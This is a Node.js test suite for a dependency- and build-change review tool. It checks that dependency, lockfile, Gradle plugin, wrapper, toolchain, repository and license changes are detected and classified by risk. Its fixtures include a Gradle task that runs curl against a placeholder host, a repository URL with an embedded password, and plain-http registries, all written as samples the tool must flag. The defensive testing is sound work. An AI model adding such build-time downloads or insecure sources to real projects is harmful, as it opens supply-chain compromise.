// ISSUE-107: dependency and build-system changes must be visible, classified,
// reviewable and resistant to alternate-manifest bypass. These tests use real
// disposable git repositories and the shipped CLI, so the report is tested at
// the same boundary CI uses.
import { strict as assert } from "node:assert";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { devNull, tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..");
const SCRIPT = join(REPO, "scripts", "dependency-review.mjs");

function gitEnv() {
  return {
    ...process.env,
    GIT_CONFIG_GLOBAL: devNull,
    GIT_CONFIG_SYSTEM: devNull,
    GIT_TERMINAL_PROMPT: "0",
  };
}

function git(dir, ...args) {
  return execFileSync("git", args, {
    cwd: dir,
    encoding: "utf8",
    env: gitEnv(),
    stdio: ["ignore", "pipe", "pipe"],
  }).trim();
}

function writeFiles(dir, files) {
  for (const [path, content] of Object.entries(files)) {
    if (content === null) {
      rmSync(join(dir, path), { force: true });
      continue;
    }
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), content);
  }
}

function fixture(files) {
  const dir = mkdtempSync(join(tmpdir(), "android-mcp-dep-review-"));
  git(dir, "init", "-q");
  git(dir, "config", "user.email", "fixture@example.test");
  git(dir, "config", "user.name", "Dependency Review Fixture");
  writeFiles(dir, files);
  git(dir, "add", "-A");
  git(dir, "commit", "-qm", "base");
  return { dir, base: git(dir, "rev-parse", "HEAD") };
}

function commit(dir, files, message = "change") {
  writeFiles(dir, files);
  git(dir, "add", "-A");
  git(dir, "commit", "-qm", message);
  return git(dir, "rev-parse", "HEAD");
}

function review(dir, args) {
  return spawnSync(process.execPath, [SCRIPT, ...args], {
    cwd: dir,
    encoding: "utf8",
    env: gitEnv(),
    timeout: 120_000,
  });
}

function jsonReview(dir, base, extra = [], expectedStatus = 0) {
  const result = review(dir, ["--base", base, "--format", "json", ...extra]);
  assert.equal(
    result.status,
    expectedStatus,
    `expected exit ${expectedStatus}, got ${result.status}\nstdout:\n${result.stdout}\nstderr:\n${result.stderr}`,
  );
  let report;
  try {
    report = JSON.parse(result.stdout);
  } catch {
    assert.fail(`stdout is not JSON:\n${result.stdout}\nstderr:\n${result.stderr}`);
  }
  return report;
}

const finding = (report, changeType, coordinate) =>
  report.findings.find(
    (entry) =>
      entry.changeType === changeType &&
      (coordinate === undefined || entry.coordinate === coordinate),
  );

const basePackage = JSON.stringify(
  { name: "fixture", version: "1.0.0", dependencies: { "left-pad": "1.3.0" } },
  null,
  2,
);

test("detects a new direct dependency with source evidence and installs nothing", () => {
  const f = fixture({ "package.json": `${basePackage}\n` });
  try {
    const revised = JSON.parse(basePackage);
    revised.dependencies.zod = "^3.23.8";
    commit(f.dir, { "package.json": `${JSON.stringify(revised, null, 2)}\n` });

    const report = jsonReview(f.dir, f.base);
    const added = finding(report, "dependency-added", "zod");
    assert.ok(added, "zod addition must be reported");
    assert.equal(added.file, "package.json");
    assert.equal(added.ecosystem, "npm");
    assert.equal(added.section, "dependencies");
    assert.equal(added.oldValue, null);
    assert.equal(added.newValue, "^3.23.8");
    assert.equal(added.risk, "medium");
    assert.equal(added.review, true);
    assert.match(added.evidence.pointer, /dependencies/);
    assert.equal(report.summary.reuse.addedDirect, 1);
    assert.match(report.summary.reuse.message, /state why|reuse|existing/i);

    assert.equal(existsSync(join(f.dir, "node_modules")), false, "inspection must not install");
    assert.equal(
      git(f.dir, "status", "--porcelain"),
      "",
      "inspection must not modify the worktree",
    );

    const second = review(f.dir, ["--base", f.base, "--format", "json"]);
    assert.equal(second.status, 0);
    assert.equal(second.stdout, review(f.dir, ["--base", f.base, "--format", "json"]).stdout);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("distinguishes removal and major update from addition", () => {
  const base = {
    name: "fixture",
    version: "1.0.0",
    dependencies: { "left-pad": "1.3.0", zod: "^3.23.8" },
  };
  const f = fixture({ "package.json": `${JSON.stringify(base, null, 2)}\n` });
  try {
    const revised = structuredClone(base);
    delete revised.dependencies["left-pad"];
    revised.dependencies.zod = "^4.0.0";
    commit(f.dir, { "package.json": `${JSON.stringify(revised, null, 2)}\n` });

    const report = jsonReview(f.dir, f.base);
    const updated = finding(report, "dependency-updated", "zod");
    const removed = finding(report, "dependency-removed", "left-pad");
    assert.ok(updated, "zod update must be reported");
    assert.ok(removed, "left-pad removal must be reported");
    assert.equal(updated.oldValue, "^3.23.8");
    assert.equal(updated.newValue, "^4.0.0");
    assert.equal(updated.details.major, true);
    assert.equal(removed.oldValue, "1.3.0");
    assert.equal(removed.newValue, null);
    assert.equal(removed.risk, "low");
    assert.equal(finding(report, "dependency-added"), undefined);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("reports lockfile-only changes, explains them and can fail on medium risk", () => {
  const lock = {
    name: "fixture",
    version: "1.0.0",
    lockfileVersion: 3,
    requires: true,
    packages: {
      "": { name: "fixture", version: "1.0.0", dependencies: { "left-pad": "1.3.0" } },
      "node_modules/left-pad": {
        version: "1.3.0",
        resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
      },
    },
  };
  const f = fixture({
    "package.json": `${basePackage}\n`,
    "package-lock.json": `${JSON.stringify(lock, null, 2)}\n`,
  });
  try {
    const revised = structuredClone(lock);
    revised.packages["node_modules/left-pad"].version = "1.3.1";
    commit(f.dir, { "package-lock.json": `${JSON.stringify(revised, null, 2)}\n` });

    const report = jsonReview(f.dir, f.base);
    assert.equal(report.summary.lockfileOnly, true);
    const only = finding(report, "lockfile-only");
    assert.ok(only, "lockfile-only change must be explicit");
    assert.equal(only.file, "package-lock.json");
    assert.equal(only.risk, "medium");
    assert.match(only.reason, /without a corresponding manifest change/i);
    assert.ok(
      only.details.updated.some((entry) => entry.name === "left-pad"),
      "resolved change must be preserved",
    );

    const strict = review(f.dir, ["--base", f.base, "--format", "json", "--fail-on", "medium"]);
    assert.equal(strict.status, 1, "medium risk must fail when the configured threshold is medium");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("flags new custom, insecure and credential-bearing repositories", () => {
  const settings = `pluginManagement { repositories { google(); mavenCentral() } }
dependencyResolutionManagement { repositories { google(); mavenCentral() } }
`;
  const f = fixture({ "settings.gradle.kts": settings });
  try {
    commit(f.dir, {
      "settings.gradle.kts": `${settings}dependencyResolutionManagement {
  repositories {
    maven { url = uri("http://insecure.example.test/releases") }
    maven { url = uri("https://user:s3cret@private.example.test/releases") }
    maven { url = uri("https://repo.example.test/releases") }
  }
}
`,
    });

    const report = jsonReview(f.dir, f.base, [], 1);
    const repos = report.findings.filter((entry) => entry.changeType === "repository-added");
    assert.equal(
      repos.length,
      3,
      `expected three repository findings, got ${JSON.stringify(repos)}`,
    );
    for (const repo of repos) assert.equal(repo.risk, "high");
    const insecure = repos.find((entry) => entry.coordinate.includes("insecure.example.test"));
    const credential = repos.find((entry) => entry.coordinate.includes("private.example.test"));
    const custom = repos.find((entry) => entry.coordinate.includes("repo.example.test"));
    assert.equal(insecure.details.secure, false);
    assert.match(insecure.reason, /http/i);
    assert.equal(credential.details.credentials, true);
    assert.match(credential.reason, /credential/i);
    assert.equal(custom.details.custom, true);
    assert.equal(custom.details.scope, "unrestricted");
    assert.doesNotMatch(
      JSON.stringify(report),
      /s3cret/,
      "embedded credentials must not be echoed",
    );
    assert.equal(report.summary.reviewRequired, true);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("detects a new Gradle plugin, toolchain change, wrapper properties and wrapper JAR", () => {
  const wrapper = `distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\\://services.gradle.org/distributions/gradle-8.7-bin.zip
`;
  const build = `plugins {
  id("com.android.application") version "8.5.0"
}
kotlin { jvmToolchain(17) }
`;
  const f = fixture({
    "build.gradle.kts": build,
    "gradle/wrapper/gradle-wrapper.properties": wrapper,
    "gradle/wrapper/gradle-wrapper.jar": Buffer.from([0, 1, 2, 3]),
  });
  try {
    commit(f.dir, {
      "build.gradle.kts": `plugins {
  id("com.android.application") version "8.5.0"
  id("com.google.devtools.ksp") version "2.0.21-1.0.25"
}
kotlin { jvmToolchain(21) }
`,
      "gradle/wrapper/gradle-wrapper.properties": wrapper.replace(
        "gradle-8.7-bin.zip",
        "gradle-8.9-bin.zip",
      ),
      "gradle/wrapper/gradle-wrapper.jar": Buffer.from([0, 1, 2, 4]),
    });

    const report = jsonReview(f.dir, f.base, [], 1);
    const plugin = finding(report, "plugin-added", "com.google.devtools.ksp");
    assert.ok(plugin, "new plugin must be reported independently");
    assert.equal(plugin.risk, "high");
    assert.equal(plugin.newValue, "2.0.21-1.0.25");
    assert.match(plugin.reason, /build plugin/i);

    const toolchain = finding(report, "toolchain-updated", "jvmToolchain");
    assert.ok(toolchain, "toolchain change must be reported");
    assert.equal(toolchain.oldValue, "17");
    assert.equal(toolchain.newValue, "21");
    assert.equal(toolchain.risk, "high");

    const wrapperChange = finding(report, "wrapper-changed");
    assert.ok(wrapperChange, "wrapper properties change must be reported");
    assert.equal(wrapperChange.risk, "high");
    assert.match(wrapperChange.reason, /download|distribution/i);
    const jar = finding(report, "wrapper-jar-changed");
    assert.ok(jar, "wrapper JAR change must be reported independently");
    assert.equal(jar.risk, "high");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("a version-catalog-only edit cannot bypass dependency, plugin or lockfile detection", () => {
  const catalog = `[versions]
gson = "2.10.1"
ksp = "2.0.21-1.0.25"

[libraries]
gson = { module = "com.google.code.gson:gson", version.ref = "gson" }

[plugins]
ksp = { id = "com.google.devtools.ksp", version.ref = "ksp" }
`;
  const build = `plugins {
  id("com.android.application") version "8.5.0"
}
dependencies {
  implementation(libs.gson)
}
`;
  const f = fixture({
    "gradle/libs.versions.toml": catalog,
    "build.gradle.kts": build,
  });
  try {
    commit(f.dir, {
      "gradle/libs.versions.toml": catalog.replace('gson = "2.10.1"', 'gson = "2.11.0"'),
    });

    const report = jsonReview(f.dir, f.base);
    const updated = finding(report, "dependency-updated", "com.google.code.gson:gson");
    assert.ok(updated, "catalog version edit must be reported");
    assert.equal(updated.file, "gradle/libs.versions.toml");
    assert.equal(updated.oldValue, "2.10.1");
    assert.equal(updated.newValue, "2.11.0");
    assert.equal(updated.risk, "low");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("reports a Gradle lockfile-only edit instead of treating it as build logic", () => {
  const f = fixture({
    "gradle.lockfile": "com.google.code.gson:gson:2.10.1=compileClasspath\n",
  });
  try {
    commit(f.dir, {
      "gradle.lockfile":
        "com.google.code.gson:gson:2.10.1=compileClasspath\ncom.squareup.okhttp3:okhttp:4.12.0=compileClasspath\n",
    });

    const report = jsonReview(f.dir, f.base);
    assert.equal(report.summary.lockfileOnly, true);
    const only = finding(report, "lockfile-only");
    assert.ok(only, "Gradle lockfile-only change must be explicit");
    assert.equal(only.file, "gradle.lockfile");
    assert.equal(only.risk, "medium");
    assert.ok(only.details.added.some((entry) => entry.name === "com.squareup.okhttp3:okhttp"));
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("surfaces deterministic reuse candidates from unchanged project declarations", () => {
  const catalog = `[versions]
gson = "2.10.1"

[libraries]
gson = { module = "com.google.code.gson:gson", version.ref = "gson" }
`;
  const f = fixture({
    "gradle/libs.versions.toml": catalog,
    "build.gradle.kts": `plugins { id("com.android.application") version "8.5.0" }
dependencies {
}
`,
  });
  try {
    commit(f.dir, {
      "build.gradle.kts": `plugins { id("com.android.application") version "8.5.0" }
dependencies {
  implementation("com.google.code.gson:gson:2.11.0")
}
`,
    });

    const report = jsonReview(f.dir, f.base);
    const added = finding(report, "dependency-added", "com.google.code.gson:gson");
    assert.ok(added, "direct Gradle dependency must be reported");
    assert.equal(added.risk, "medium");
    assert.ok(Array.isArray(added.equivalenceCandidates));
    assert.ok(
      added.equivalenceCandidates.some((entry) => entry.file === "gradle/libs.versions.toml"),
      `catalog equivalent must be surfaced: ${JSON.stringify(added.equivalenceCandidates)}`,
    );
    assert.ok(added.equivalenceCandidates.some((entry) => entry.kind === "exact-module"));
    assert.match(report.summary.reuse.message, /existing|reuse/i);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("reports unknown and failed license states instead of passing them", () => {
  const base = {
    name: "fixture",
    version: "1.0.0",
    dependencies: { "known-permissive": "1.0.0", "known-copyleft": "1.0.0" },
  };
  const f = fixture({ "package.json": `${JSON.stringify(base, null, 2)}\n` });
  try {
    mkdirSync(join(f.dir, "node_modules", "known-permissive"), { recursive: true });
    writeFileSync(
      join(f.dir, "node_modules", "known-permissive", "package.json"),
      JSON.stringify({ name: "known-permissive", version: "1.0.0", license: "MIT" }),
    );
    mkdirSync(join(f.dir, "node_modules", "known-copyleft"), { recursive: true });
    writeFileSync(
      join(f.dir, "node_modules", "known-copyleft", "package.json"),
      JSON.stringify({ name: "known-copyleft", version: "1.0.0", license: "AGPL-3.0-only" }),
    );
    git(f.dir, "add", "-A");
    git(f.dir, "commit", "-qm", "installed fixtures");

    const revised = structuredClone(base);
    revised.dependencies["unknown-license"] = "1.0.0";
    commit(f.dir, { "package.json": `${JSON.stringify(revised, null, 2)}\n` });

    const report = jsonReview(f.dir, f.base);
    assert.equal(report.summary.license.status, "fail");
    assert.ok(report.summary.license.fail.some((entry) => entry.name === "known-copyleft"));
    assert.ok(report.summary.license.unknown.some((entry) => entry.name === "unknown-license"));
    assert.equal(report.summary.advisories.status, "unavailable");
    assert.match(report.summary.advisories.reason, /not requested|unavailable/i);
    assert.notEqual(report.summary.advisories.status, "pass");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("fails closed for suspicious build logic, npm config and verification metadata", () => {
  const f = fixture({
    "build.gradle.kts": `plugins { id("com.android.application") version "8.5.0" }\n`,
    ".npmrc": "registry=https://registry.npmjs.org/\n",
    "gradle/verification-metadata.xml": "<verification-metadata/>\n",
  });
  try {
    commit(f.dir, {
      "build.gradle.kts": `plugins { id("com.android.application") version "8.5.0" }
tasks.register("prepare") {
  doLast {
    exec {
      commandLine("curl", "http://downloads.example.test/tool")
    }
  }
}
`,
      ".npmrc": "registry=http://registry.example.test/\n",
      "gradle/verification-metadata.xml":
        "<verification-metadata><components/></verification-metadata>\n",
    });

    const report = jsonReview(f.dir, f.base, [], 1);
    const logic = finding(report, "build-logic-change");
    assert.ok(logic, "unrecognized build logic must not be silently ignored");
    assert.equal(logic.risk, "high");
    assert.match(logic.reason, /download|exec|suspicious/i);
    const npmrc = finding(report, "npmrc-changed");
    assert.ok(npmrc, ".npmrc change must be reported");
    assert.equal(npmrc.risk, "high");
    assert.match(npmrc.reason, /insecure|http/i);
    const verification = finding(report, "verification-metadata-changed");
    assert.ok(verification, "Gradle verification metadata change must be reported");
    assert.equal(verification.risk, "high");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("fails closed when the requested base cannot be resolved", () => {
  const f = fixture({ "package.json": `${basePackage}\n` });
  try {
    const result = review(f.dir, ["--base", "does-not-exist", "--format", "json"]);
    assert.equal(result.status, 2);
    assert.match(result.stderr, /base-unavailable|cannot resolve base/i);
    assert.equal(result.stdout.trim(), "");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("writes a deterministic SBOM only when explicitly requested", () => {
  const f = fixture({
    "package.json": `${basePackage}\n`,
  });
  try {
    const revised = JSON.parse(basePackage);
    revised.dependencies.zod = "^3.23.8";
    commit(f.dir, { "package.json": `${JSON.stringify(revised, null, 2)}\n` });

    const without = jsonReview(f.dir, f.base);
    assert.equal(without.summary.sbom.status, "unavailable");
    assert.equal(existsSync(join(f.dir, "sbom.json")), false);

    const sbomPath = join(f.dir, "..", `sbom-${process.pid}.json`);
    const first = jsonReview(f.dir, f.base, ["--sbom", sbomPath]);
    const firstBytes = readFileSync(sbomPath, "utf8");
    const second = jsonReview(f.dir, f.base, ["--sbom", sbomPath]);
    assert.equal(first.summary.sbom.status, "written");
    assert.ok(existsSync(sbomPath));
    const sbom = JSON.parse(firstBytes);
    assert.equal(sbom.bomFormat, "CycloneDX");
    assert.equal(sbom.specVersion, "1.5");
    const names = sbom.components.map((component) => component.name);
    assert.deepEqual(
      names,
      [...names].sort((a, b) => a.localeCompare(b)),
      "components must be sorted",
    );
    assert.ok(sbom.components.some((component) => component.name === "zod"));
    assert.equal(second.summary.sbom.status, "written");
    assert.equal(readFileSync(sbomPath, "utf8"), firstBytes);
    rmSync(sbomPath, { force: true });
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("reports npm overrides and local binary dependencies as high risk", () => {
  const base = { name: "fixture", version: "1.0.0", dependencies: { "left-pad": "1.3.0" } };
  const f = fixture({
    "package.json": `${JSON.stringify(base, null, 2)}\n`,
    "build.gradle.kts": `dependencies { }\n`,
  });
  try {
    const revised = structuredClone(base);
    revised.overrides = { "left-pad": "1.3.1" };
    commit(f.dir, {
      "package.json": `${JSON.stringify(revised, null, 2)}\n`,
      "build.gradle.kts": `dependencies { implementation(files("libs/local.jar")) }\n`,
    });

    const report = jsonReview(f.dir, f.base, [], 1);
    const override = finding(report, "override-added", "left-pad");
    assert.ok(override, "override addition must be reported");
    assert.equal(override.risk, "high");
    assert.match(override.reason, /override|transitive|redirect/i);
    const local = report.findings.find(
      (entry) => entry.changeType === "dependency-added" && /local\.jar/.test(entry.coordinate),
    );
    assert.ok(local, "local binary dependency must be reported");
    assert.equal(local.risk, "high");
    assert.match(local.reason, /local|binary|file/i);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("markdown output is deterministic and names every high-risk finding", () => {
  const settings = "dependencyResolutionManagement { repositories { google() } }\n";
  const f = fixture({ "settings.gradle.kts": settings });
  try {
    commit(f.dir, {
      "settings.gradle.kts": `${settings}maven { url = uri("https://custom.example.test/releases") }\n`,
    });
    const first = review(f.dir, ["--base", f.base, "--format", "markdown"]);
    const second = review(f.dir, ["--base", f.base, "--format", "markdown"]);
    assert.equal(first.status, 1);
    assert.equal(first.stdout, second.stdout);
    assert.match(first.stdout, /Custom repository/);
    assert.match(first.stdout, /custom\.example\.test/);
    assert.match(first.stdout, /High/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("deleting a package manifest fails closed instead of hiding dependency removals", () => {
  const f = fixture({ "package.json": `${basePackage}\n` });
  try {
    commit(f.dir, { "package.json": null });
    const report = jsonReview(f.dir, f.base, [], 1);
    const removed = finding(report, "manifest-removed", "package.json");
    assert.ok(removed, "manifest deletion must be explicit");
    assert.equal(removed.risk, "high");
    assert.equal(report.summary.reviewRequired, true);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("detects Android SDK and Compose compiler version changes", () => {
  const build = `android {
  compileSdk = 34
  targetSdk = 34
  minSdk = 24
}
composeOptions {
  kotlinCompilerExtensionVersion = "1.5.14"
}
`;
  const f = fixture({ "app/build.gradle.kts": build });
  try {
    commit(f.dir, {
      "app/build.gradle.kts": build
        .replace("compileSdk = 34", "compileSdk = 35")
        .replace("targetSdk = 34", "targetSdk = 35")
        .replace("minSdk = 24", "minSdk = 26")
        .replace(
          'kotlinCompilerExtensionVersion = "1.5.14"',
          'kotlinCompilerExtensionVersion = "1.5.15"',
        ),
    });
    const report = jsonReview(f.dir, f.base, [], 1);
    for (const [coordinate, oldValue, newValue] of [
      ["compileSdk", "34", "35"],
      ["targetSdk", "34", "35"],
      ["minSdk", "24", "26"],
      ["kotlinCompilerExtensionVersion", "1.5.14", "1.5.15"],
    ]) {
      const change = finding(report, "toolchain-updated", coordinate);
      assert.ok(change, `${coordinate} change must be reported`);
      assert.equal(change.oldValue, oldValue);
      assert.equal(change.newValue, newValue);
      assert.equal(change.risk, "high");
    }
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test("build-only catalog aliases cannot hide a dependency or plugin addition", () => {
  const catalog = `[versions]
gson = "2.10.1"
ksp = "2.0.21-1.0.25"

[libraries]
gson = { module = "com.google.code.gson:gson", version.ref = "gson" }

[plugins]
ksp = { id = "com.google.devtools.ksp", version.ref = "ksp" }
`;
  const f = fixture({
    "gradle/libs.versions.toml": catalog,
    "build.gradle.kts": `plugins {
  id("com.android.application") version "8.5.0"
}
dependencies {
}
`,
  });
  try {
    commit(f.dir, {
      "build.gradle.kts": `plugins {
  id("com.android.application") version "8.5.0"
  alias(libs.plugins.ksp)
}
dependencies {
  implementation(libs.gson)
}
`,
    });
    const report = jsonReview(f.dir, f.base, [], 1);
    const plugin = finding(report, "plugin-added", "com.google.devtools.ksp");
    assert.ok(plugin, "catalog plugin alias must be resolved and reported");
    assert.equal(plugin.risk, "high");
    assert.equal(plugin.newValue, "2.0.21-1.0.25");
    const dependency = finding(report, "dependency-added", "com.google.code.gson:gson");
    assert.ok(dependency, "catalog library alias must be resolved and reported");
    assert.equal(dependency.risk, "medium");
    assert.equal(dependency.newValue, "2.10.1");
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});
